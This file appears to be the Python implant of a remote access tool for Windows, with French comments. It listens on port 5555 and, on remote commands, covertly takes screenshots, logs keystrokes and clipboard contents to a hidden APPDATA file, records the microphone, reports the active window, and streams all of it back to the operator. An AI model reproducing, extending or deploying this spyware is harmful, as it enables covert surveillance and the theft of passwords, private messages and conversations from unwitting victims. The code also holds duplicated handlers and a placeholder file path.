import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
from pynput import keyboard
import json
from datetime import datetime
import pyperclip
import pyaudio
import wave
import speech_recognition as sr
from pydub import AudioSegment
import sys

host = "0.0.0.0"
port = 5555

keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
keylog_listener = None
audio_recording = False
audio_frames = []

keylog_buffer = []
last_minute = ""

# Vérifier si le fichier existe, sinon on le crée en mode dict
if not os.path.exists(keylog_file):
    with open(keylog_file, "w", encoding="utf-8") as f:
        json.dump({}, f)

def save_keylog_buffer():
    global keylog_buffer, last_minute
    try:
        with open(keylog_file, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                if not isinstance(data, dict):
                    data = {}
            except:
                data = {}

        if keylog_buffer:
            current_text = data.get(last_minute, "")
            current_text += "".join(keylog_buffer)
            data[last_minute] = current_text

            with open(keylog_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            keylog_buffer = []

    except Exception as e:
        print(f"[!] Erreur en sauvegardant le buffer : {e}")

def on_press(key):
    global keylog_buffer, last_minute
    try:
        now = datetime.now()
        current_minute = now.strftime("%Y-%m-%d %H:%M")

        if current_minute != last_minute:
            save_keylog_buffer()
            last_minute = current_minute

        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keylog_buffer.append(" ")
        elif key == keyboard.Key.enter:
            keylog_buffer.append("\n")
        elif key == keyboard.Key.backspace:
            if keylog_buffer:
                keylog_buffer.pop()
        elif key == keyboard.Key.shift:
            keylog_buffer.append("<Shift>")
        elif key == keyboard.Key.ctrl:
            keylog_buffer.append("<Ctrl>")
        elif key == keyboard.Key.alt:
            keylog_buffer.append("<Alt>")
        elif key == keyboard.Key.tab:
            keylog_buffer.append("<Tab>")
        elif key == keyboard.Key.caps_lock:
            keylog_buffer.append("<Caps Lock>")
        elif key == keyboard.KeyCode.from_char('\u0016') and keyboard.Listener.ctrl_pressed:
            clipboard_content = get_clipboard_content()
            if clipboard_content:
                keylog_buffer.append(f"\n[Ctrl+V] Clipboard Content: {clipboard_content}\n")
        else:
            keylog_buffer.append(f"<{key.name}>")

    except Exception as e:
        print(f"Erreur dans le keylogger: {e}")

def keylogger_thread():
    global keylog_listener
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_listener.join()

def get_clipboard_content():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Erreur presse-papiers : {e}")
        return None

def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path, filename

def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur: {str(e)}"

def send_audio_file(connection, audio_path):
    try:
        # Vérifie si le fichier audio existe
        if not os.path.exists(audio_path):
            connection.send("Erreur: fichier audio introuvable.".encode())
            return
        
        # Envoie la taille du fichier audio
        file_size = os.path.getsize(audio_path)
        connection.send(struct.pack("!I", file_size))

        # Envoie le fichier audio
        with open(audio_path, "rb") as file:
            data = file.read(1024)
            while data:
                connection.send(data)
                data = file.read(1024)

        connection.send(b"END_OF_FILE")  # Envoie un message de fin de fichier
        print("[+] Fichier audio envoyé.")
    except Exception as e:
        connection.send(f"Erreur lors de l'envoi du fichier audio : {e}".encode())
    
def stop_recording(conn):
    global audio_recording, audio_frames
    audio_recording = False
    filename = save_audio_recording()
    if filename:
        try:
            with open(filename, "rb") as audio_file:
                audio_data = audio_file.read()
            file_size = len(audio_data)
            conn.sendall(struct.pack("!I", file_size))  # Envoie la taille du fichier
            conn.sendall(os.path.basename(filename).encode().ljust(100))  # Envoie le nom du fichier
            conn.sendall(audio_data)  # Envoie les données audio
        except Exception as e:
            conn.sendall(f"[!] Erreur envoi fichier: {str(e)}".encode())
    else:
        conn.sendall(b"[!] Aucun fichier audio a envoyer")

def handle_client(conn):
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                break

            command = data.decode().strip()
            if command == "SEND_AUDIO":
                audio_path = "path_to_audio_file.wav"  # Remplace par le chemin du fichier audio
                send_audio_file(conn, audio_path)

        except Exception as e:
            print(f"Erreur avec le client : {e}")
            break

    conn.close()


def start_audio_recording(duration, conn):
    global audio_recording, audio_frames
    try:
        audio = pyaudio.PyAudio()
        if audio.get_device_count() == 0:
            conn.send(b"[!] Aucun microphone detecte")
            return False

        stream = audio.open(format=pyaudio.paInt16,
                          channels=1,
                          rate=44100,
                          input=True,
                          frames_per_buffer=1024,
                          input_device_index=audio.get_default_input_device_info()["index"])
        
        conn.send(b"[+] Enregistrement demarre")
        audio_frames = []
        for _ in range(0, int(44100 / 1024 * duration)):
            if audio_recording:
                try:
                    data = stream.read(1024, exception_on_overflow=False)
                    audio_frames.append(data)
                except IOError:
                    continue
        return True
    except Exception as e:
        conn.send(f"[!] Erreur microphone: {str(e)}".encode())
        return False
    finally:
        if 'stream' in locals():
            stream.stop_stream()
            stream.close()
        if 'audio' in locals():
            audio.terminate()

def save_audio_recording():
    global audio_frames
    if not audio_frames:
        return None

    audio_dir = "audio_recordings"
    if not os.path.exists(audio_dir):
        os.makedirs(audio_dir)

    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = os.path.join(audio_dir, f"recording_{timestamp}.wav")

    wf = wave.open(filename, 'wb')
    wf.setnchannels(1)  # Mono
    wf.setsampwidth(2)  # 2 bytes = 16 bits
    wf.setframerate(44100)
    wf.writeframes(b''.join(audio_frames))
    wf.close()

    print(f"[+] Enregistrement sauvegardé : {filename}")
    return filename

def transcribe_audio(filename):
    try:
        recognizer = sr.Recognizer()
        with sr.AudioFile(filename) as source:
            audio_data = recognizer.record(source)
            return recognizer.recognize_google(audio_data, language='fr-FR')
    except Exception as e:
        print(f"[!] Erreur transcription : {e}")
        return None

async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

async def handle_client(conn):
    global keylog_listener, audio_recording

    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                file_size = len(data)
                conn.sendall(struct.pack("!I", file_size))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            elif command == "START_KEYLOG":
                if keylog_listener is None or not keylog_listener.running:
                    keylog_thread = threading.Thread(target=keylogger_thread)
                    keylog_thread.daemon = True
                    keylog_thread.start()
                    conn.send(b"Keylogger started")
                else:
                    conn.send(b"Keylogger already running")

            elif command == "STOP_KEYLOG":
                if keylog_listener:
                    keylog_listener.stop()
                    keylog_listener = None
                    conn.send(b"Keylogger stopped")
                else:
                    conn.send(b"No active keylogger")

            elif command == "GET_KEYLOGS":
                try:
                    save_keylog_buffer()
                    if os.path.exists(keylog_file):
                        with open(keylog_file, "r", encoding="utf-8") as f:
                            data = f.read()
                        conn.sendall(data.encode())
                    else:
                        conn.sendall(b"[!] Aucun fichier de log trouve.")
                except Exception as e:
                    conn.sendall(f"[!] Erreur : {str(e)}".encode())

            elif command == "GET_CLIPBOARD":
                clipboard_content = get_clipboard_content()
                conn.send(clipboard_content.encode() if clipboard_content else b"[!] Presse-papiers vide")

            elif command.startswith("START_AUDIO_RECORDING"):
                duration = int(command.split()[1])
                threading.Thread(target=start_audio_recording, args=(duration, conn)).start()
                conn.send(b"Audio recording started")

            elif command == "STOP_AUDIO_RECORDING":
                audio_recording = False
                filename = save_audio_recording()
                if filename:
                    try:
                        with open(filename, "rb") as audio_file:
                            audio_data = audio_file.read()
                        file_size = len(audio_data)
                        conn.sendall(struct.pack("!I", file_size))  # Envoie la taille du fichier
                        conn.sendall(os.path.basename(filename).encode().ljust(100))  # Envoie le nom du fichier
                        conn.sendall(audio_data)  # Envoie les données audio
                    except Exception as e:
                        conn.sendall(f"[!] Erreur envoi fichier: {str(e)}".encode())
                else:
                    conn.sendall(b"[!] Aucun fichier audio a envoyer")

            elif command == "STOP_AUDIO_RECORDING":
                audio_recording = False
                filename = save_audio_recording()
                if filename:
                    try:
                        # Attendre un peu pour s'assurer que le fichier est bien fermé
                        time.sleep(0.5)
                        
                        # Lire le fichier en binaire
                        with open(filename, "rb") as audio_file:
                            audio_data = audio_file.read()
                            
                        # Envoyer la taille du fichier
                        file_size = len(audio_data)
                        conn.sendall(struct.pack("!I", file_size))
                        
                        # Envoyer le nom du fichier
                        base_filename = os.path.basename(filename)
                        conn.sendall(base_filename.encode().ljust(100))
                        
                        # Envoyer les données audio par blocs
                        sent = 0
                        chunk_size = 4096
                        while sent < file_size:
                            chunk = audio_data[sent:sent+chunk_size]
                            if not chunk:
                                break
                            conn.sendall(chunk)
                            sent += len(chunk)
                            
                        print(f"[+] Fichier audio envoyé: {sent}/{file_size} octets")
                    except Exception as e:
                        print(f"[!] Erreur envoi audio: {str(e)}")
                        conn.sendall(struct.pack("!I", 0))  # Envoyer taille 0 en cas d'erreur
                else:
                    conn.sendall(struct.pack("!I", 0))  # Envoyer taille 0 si pas de fichier

        except Exception as e:
            print(f"[!] Exception : {e}")
            break

    conn.close()
    print("[-] Connexion fermee.")


def is_pcm_wav(filename):
    """Vérifie si le fichier WAV est au format PCM 16-bit mono 44100Hz"""
    try:
        with wave.open(filename, "rb") as wf:
            sample_width = wf.getsampwidth()
            frame_rate = wf.getframerate()
            channels = wf.getnchannels()
            print(f"[DEBUG] Format: {sample_width*8} bits, {frame_rate} Hz, {channels} channels")
            return sample_width == 2 and frame_rate == 44100 and channels == 1
    except Exception as e:
        print(f"[!] Erreur lecture WAV: {e}")
        return False

def ensure_pcm_wav(input_path):
    if is_pcm_wav(input_path):
        return input_path
        
    output_path = input_path + "_converted.wav"
    try:
        audio = AudioSegment.from_file(input_path)
        audio = audio.set_frame_rate(44100).set_channels(1).set_sample_width(2)
        audio.export(output_path, format="wav")
        return output_path
    except Exception as e:
        print(f"[!] Erreur conversion: {e}")
        return None

async def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] En attente sur {host}:{port}")

    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion de {addr[0]}")
        await handle_client(conn)

if __name__ == "__main__":
    asyncio.run(main())